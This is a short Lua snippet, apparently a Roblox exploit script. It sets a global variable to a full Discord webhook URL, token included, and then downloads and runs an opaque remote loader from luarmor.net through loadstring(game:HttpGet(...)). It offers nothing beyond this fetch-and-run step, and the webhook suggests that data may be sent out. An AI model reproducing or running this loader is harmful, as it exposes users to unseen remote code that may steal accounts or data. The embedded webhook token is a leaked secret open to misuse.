...
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1534521387547361300/9sOa3Ww79mnSfuPmVnrW3-I1exL3aIPrDGwZIBNiO0xM63kVvOBiDFrYQqy85CmcSmBp"
...
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/e0d506d990f25b3b9925ab4db82b1549.lua"))()
end)